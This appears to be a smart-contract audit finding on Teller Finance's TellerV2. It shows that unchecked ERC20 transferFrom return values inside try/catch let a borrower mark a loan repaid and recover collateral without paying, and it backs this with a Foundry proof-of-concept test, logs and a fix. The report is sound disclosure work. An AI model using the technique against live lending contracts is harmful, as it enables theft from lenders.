Fantastic Gingerbread Gerbil

medium

# Users can repay loans without making payments if the token is an ERC20 that returns false rather than reverting.

## Summary
The TellerV2 contract has an internal function called _repayLoan() which is used to make a loan payment. Inside the _repayLoan() function, the TellerV2 contract calls another internal function called _sendOrEscrowFunds(). However, this function uses ERC20.transferFrom rather than SafeERC20 functions. If the ERC20 token utilized returns false rather than reverts, then the borrower will be able to repay his loan without actually making any payments.

https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/TellerV2.sol#L887

https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/TellerV2.sol#L901

This is important because according to the contest description, Teller is planning on "allowing any standard token that would be compatible with Uniswap V3 to work with our codebase, just as was the case for the original audit of TellerV2.sol . The tokens are assumed to be able to work with Uniswap V3 ." Here is a random token that is currently trading on Uniswap which returns false instead of reverting : https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498. This is just to show that such tokens which return false rather than revert are expected to be encountered in the protocol. 

## Vulnerability Detail
The driving force behind this issue is the improper use of try/catch logic. 

```solidity
function _sendOrEscrowFunds(uint256 _bidId, Payment memory _payment)
        internal
    {
        Bid storage bid = bids[_bidId];
        address lender = getLoanLender(_bidId);

        uint256 _paymentAmount = _payment.principal + _payment.interest;

        try 

            bid.loanDetails.lendingToken.transferFrom{ gas: 100000 }(
                _msgSenderForMarket(bid.marketplaceId),
                lender,
                _paymentAmount
            )
        {} catch {
      .......

```

In Solidity try / catch can only catch errors from external function calls and contract creation. The try keyword has to be followed by an expression representing an external function call or a contract creation. Errors inside the expression are not caught (for example if it is a complex expression that also involves internal function calls), only a revert happening inside the external call itself. (https://docs.soliditylang.org/en/latest/control-structures.html)

The _sendOrEscrowFunds() function has an ERC20.transferFrom as the expression which follows the try keyword. For most modern tokens, if the transferFrom fails, then the catch block will execute. However, if the transferFrom does not go through with an ERC20 tokens which return false rather than revert, then the catch block will never be executed and the function will continue to execute. Following this, the _repayLoan() function which called the _sendOrEscrowFunds() will continue to execute 

```solidity
function _repayLoan(
        uint256 _bidId,
        Payment memory _payment,
        uint256 _owedAmount,
        bool _shouldWithdrawCollateral
    ) internal virtual {
        .........

        _sendOrEscrowFunds(_bidId, _payment); //send or escrow the funds

        // update our mappings
        bid.loanDetails.totalRepaid.principal += _payment.principal;
        bid.loanDetails.totalRepaid.interest += _payment.interest;
        bid.loanDetails.lastRepaidTimestamp = uint32(block.timestamp);

        // If the loan is paid in full and has a mark, we should update the current reputation
        if (mark != RepMark.Good) {
            reputationManager.updateAccountReputation(bid.borrower, _bidId);
        }
    }
```

This leads to the bid.loanDetails.totalRepaid.principal and bid.loanDetails.totalRepaid.interest both getting increased while the borrower did not actually make any payments. 

## Impact
This could allow borrows to repay their loans without making any payments.
## Code Snippet
Here is the test_collateralEscrow() test from TellerV2_Test. Log statements have been added.

```solidity
function test_collateralEscrow() public {
        // Submit bid as borrower
        uint256 bidId = submitCollateralBid();
        // Accept bid as lender
        acceptBid(bidId);

        // Get newly created escrow
        address escrowAddress = collateralManager._escrows(bidId);
        CollateralEscrowV1 escrow = CollateralEscrowV1(escrowAddress);

        uint256 storedBidId = escrow.getBid();

        // Test that the created escrow has the same bidId and collateral stored
        assertEq(bidId, storedBidId, "Collateral escrow was not created");

        uint256 escrowBalance = wethMock.balanceOf(escrowAddress);

        assertEq(collateralAmount, escrowBalance, "Collateral was not stored");

        vm.warp(100000);

        // Repay loan
        uint256 borrowerBalanceBefore = wethMock.balanceOf(address(borrower));
        uint256 borrowerDaiBalanceBefore = daiMock.balanceOf(address(borrower));
        console.log("Borrower WETH balance before : ", borrowerBalanceBefore);
        console.log("Borrower DAI balance before : ", borrowerDaiBalanceBefore);

        Payment memory amountOwed = tellerV2.calculateAmountOwed(
            bidId,
            block.timestamp
        );
        borrower.addAllowance(
            address(daiMock),
            address(tellerV2),
            amountOwed.principal + amountOwed.interest
        );
        borrower.repayLoanFull(bidId);
        console.log("-- Calling borrower.repayLoanFull(bidId); --");

        // Check escrow balance
        uint256 escrowBalanceAfter = wethMock.balanceOf(escrowAddress);
        assertEq(
            0,
            escrowBalanceAfter,
            "Collateral was not withdrawn from escrow on repayment"
        );

        // Check borrower balance for collateral
        uint256 borrowerBalanceAfter = wethMock.balanceOf(address(borrower));
        assertEq(
            collateralAmount,
            borrowerBalanceAfter - borrowerBalanceBefore,
            "Collateral was not sent to borrower after repayment"
        );

        uint256 borrowerDaiBalanceAfter = daiMock.balanceOf(address(borrower));
        console.log("Borrower WETH balance after : ", borrowerBalanceAfter);
        console.log("Borrower DAI balance after : ", borrowerDaiBalanceAfter);
    }
```

When we run this test we get the following result. We can see that the collateral balance of the borrower increases after calling 
repayLoanFull() while the DAI balance decreases. 

Logs:
  Borrower WETH balance before :  49990
  Borrower DAI balance before :  50095
  -- Calling borrower.repayLoanFull(bidId); --
  Borrower WETH balance after :  50000
  Borrower DAI balance after :  49995

Here is the same test except that the ERC20 token we are using has now been edited to return false rather than revert. We are also no longer going to add an allowance. Note, that the token is named "DAI" in the test but it is not the actual DAI token. This applies for the provided test above as well. 

```solidity
function test_collateralEscrow() public {
        // Submit bid as borrower
        uint256 bidId = submitCollateralBid();
        // Accept bid as lender
        acceptBid(bidId);

        // Get newly created escrow
        address escrowAddress = collateralManager._escrows(bidId);
        CollateralEscrowV1 escrow = CollateralEscrowV1(escrowAddress);

        uint256 storedBidId = escrow.getBid();

        // Test that the created escrow has the same bidId and collateral stored
        assertEq(bidId, storedBidId, "Collateral escrow was not created");

        uint256 escrowBalance = wethMock.balanceOf(escrowAddress);

        assertEq(collateralAmount, escrowBalance, "Collateral was not stored");

        vm.warp(100000);

        // Repay loan
        uint256 borrowerBalanceBefore = wethMock.balanceOf(address(borrower));
        uint256 borrowerDaiBalanceBefore = daiMock.balanceOf(address(borrower));
        console.log("Borrower WETH balance before : ", borrowerBalanceBefore);
        console.log("Borrower DAI balance before : ", borrowerDaiBalanceBefore);

        Payment memory amountOwed = tellerV2.calculateAmountOwed(
            bidId,
            block.timestamp
        );
        /*borrower.addAllowance(
            address(daiMock),
            address(tellerV2),
            amountOwed.principal + amountOwed.interest
        );*/
        borrower.repayLoanFull(bidId);
        console.log("-- Calling borrower.repayLoanFull(bidId); --");

        // Check escrow balance
        uint256 escrowBalanceAfter = wethMock.balanceOf(escrowAddress);
        assertEq(
            0,
            escrowBalanceAfter,
            "Collateral was not withdrawn from escrow on repayment"
        );

        // Check borrower balance for collateral
        uint256 borrowerBalanceAfter = wethMock.balanceOf(address(borrower));
        assertEq(
            collateralAmount,
            borrowerBalanceAfter - borrowerBalanceBefore,
            "Collateral was not sent to borrower after repayment"
        );

        uint256 borrowerDaiBalanceAfter = daiMock.balanceOf(address(borrower));
        console.log("Borrower WETH balance after : ", borrowerBalanceAfter);
        console.log("Borrower DAI balance after : ", borrowerDaiBalanceAfter);
    }
```

When we run the test, we can see that the collateral balance (WETH) of the borrower goes up but the borrower does not loose any DAI in the process of repaying the loan. This is because we are now using an ERC20 which returns false and rather than reverts. When we don't increase the allowance, a modern ERC20 token will revert in the _sendOrEscrowFunds() function leading the catch block in the try/catch to be executed. However, when an ERC20 which returns false is used, the catch block will not be executed even though the transfer was not successful. 

Logs:
  Borrower WETH balance before :  49990
  Borrower DAI balance before :  50095
  -- Calling borrower.repayLoanFull(bidId); --
  Borrower WETH balance after :  50000
  Borrower DAI balance after :  50095


If we run the original test but without adding allowance, the test will fail due to "revert: ERC20: insufficient allowance]". 

## Tool used
Foundry

Manual Review

## Recommendation
Keep track of the borrower's balance before and after the repayment to make sure that the payment was made.